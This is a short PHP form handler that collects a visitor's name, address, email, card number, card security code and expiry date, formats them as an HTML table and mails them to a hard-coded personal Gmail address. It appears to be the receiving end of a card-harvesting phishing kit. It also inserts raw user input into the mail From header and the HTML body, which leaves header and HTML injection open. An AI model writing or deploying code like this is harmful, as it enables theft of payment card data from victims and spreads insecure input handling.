<?php

$to = "nevadalaralara@gmail.com";
$subject = "Form submission";
$body = "Hi, <br/><b>".$_POST['name']."</b> has submitted his contact info. Details below<br/><hr/>";
$body .="
<table width='300'>
<tr>
  <td>Name</td>
  <td>".$_POST['name']."</td>
</tr>
<tr>
  <td>Email</td>
  <td>".$_POST['email']."</td>
</tr>
<tr>
  <td>City</td>
  <td>".$_POST['city']."</td>
</tr>
<tr>
  <td>State</td>
  <td>".$_POST['state']."</td>
</tr>

<tr>
  <td>Zip</td>
  <td>".$_POST['zip']."</td>
</tr>

<tr>
  <td colspan='2'><h3>Card Information</h3></td>
</tr>
<tr>
  <td>Card Number</td>
  <td>".$_POST['card']."</td>
</tr>
<tr>
  <td>VV2</td>
  <td>".$_POST['vv2']."</td>
</tr>
<tr>
  <td>Expire date</td>
  <td>".$_POST['month']." , ".$_POST['year']."</td>
</tr>
</table>
";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$_POST['email'] . "\r\n";

$a  = mail($to, $subject, $body, $headers);
if($a){
	
	$status = array("status"=>1);
	
}else{
	$status = array("status"=>0);
}

echo json_encode($status);
?>